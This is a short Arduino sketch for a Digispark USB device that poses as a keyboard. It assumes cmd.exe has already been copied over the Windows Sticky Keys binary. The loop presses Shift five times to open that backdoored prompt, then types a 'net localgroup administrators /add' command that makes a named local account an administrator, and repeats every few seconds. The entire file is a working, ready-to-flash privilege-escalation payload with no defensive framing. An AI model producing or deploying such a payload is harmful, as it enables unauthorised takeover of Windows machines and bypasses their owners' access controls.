#include "DigiKeyboard.h"
/*
 * Starts a cmd after cmd is copied to sethc
 * and makes users admin
 * Copyright Kris Occhipinti Feb 28th 2017
 * htttp://FilmsByKris.com
 * 
   This program is free software; you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation; either version 3 of the License, or
   (at your option) any later version.
   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.
   You should have received a copy of the GNU General Public License
   along with this program; if not, write to the Free Software Foundation,
   Inc., 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301  USA

   https://www.gnu.org/licenses/gpl-3.0.txt

 */


void setup() {
  DigiKeyboard.update();
}


void loop() {
  delay(100);
  DigiKeyboard.update(); // Keeps kepboard connected
  delay(100);
  // this is generally not necessary but with some older systems it seems to
  // prevent missing the first character after a delay:
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(MOD_SHIFT_LEFT);
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(MOD_SHIFT_LEFT);
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(MOD_SHIFT_LEFT);
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(MOD_SHIFT_LEFT);
  DigiKeyboard.delay(100);
  DigiKeyboard.sendKeyStroke(MOD_SHIFT_LEFT);

  DigiKeyboard.delay(200);

  DigiKeyboard.println("cmd");
  DigiKeyboard.println("net localgroup administrators /add station24-1");
  DigiKeyboard.println("exit");
  DigiKeyboard.println("exit");
  // It's better to use DigiKeyboard.delay() over the regular Arduino delay()
  // if doing keyboard stuff because it keeps talking to the computer to make
  // sure the computer knows the keyboard is alive and connected
  DigiKeyboard.delay(5000);
}
